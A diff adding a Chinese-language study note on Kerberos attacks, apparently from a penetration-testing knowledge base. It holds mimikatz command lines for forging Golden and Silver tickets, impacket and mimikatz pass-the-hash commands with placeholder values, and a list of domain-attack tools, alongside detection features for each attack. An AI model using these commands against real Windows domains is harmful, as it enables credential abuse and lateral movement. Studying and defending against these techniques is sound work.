@@ -1,0 +1,49 @@
+# Kerberos 协议与票据攻击
+
+## Kerberos 基础
+```
+客户端 → AS → TGT → TGS → 服务票据 → 访问服务
+
+关键组件：
+  KDC（Key Distribution Center）= AS + TGS
+  TGT（Ticket Granting Ticket）
+  ST（Service Ticket）
+```
+
+## 黄金票据（Golden Ticket）
+```
+伪造 TGT（krbtgt 账号的 NTLM Hash）
+特征：无 AS-REQ 包、TGT 生命周期异常
+条件：需要域控权限 + krbtgt hash
+
+利用：
+  mimikatz # kerberos::golden /domain:域名 /sid:域SID /krbtgt:krbtgt_hash /user:任意用户 /ptt
+```
+
+## 白银票据（Silver Ticket）
+```
+伪造 ST（服务的 NTLM Hash）
+只能访问特定服务，不接触域控
+特征：无 TGS-REQ 包
+
+利用：
+  mimikatz # kerberos::golden /domain:域名 /sid:域SID /target:目标服务器 /service:服务 /rc4:hash /user:任意用户 /ptt
+```
+
+## Pass The Hash（哈希传递）
+```bash
+# 直接使用 NTLM Hash 登录
+impacket-wmiexec -hashes :NTLM_HASH 域名/用户@IP
+impacket-psexec -hashes :NTLM_HASH 域名/用户@IP
+
+# mimikatz
+sekurlsa::pth /user:admin /domain:域名 /ntlm:HASH
+```
+
+## 域渗透常用工具
+```bash
+BloodHound          # 域关系分析
+mimikatz            # 密码抓取、票据伪造
+impacket            # 多种协议工具套件
+crackmapexec        # 批量检测
+```
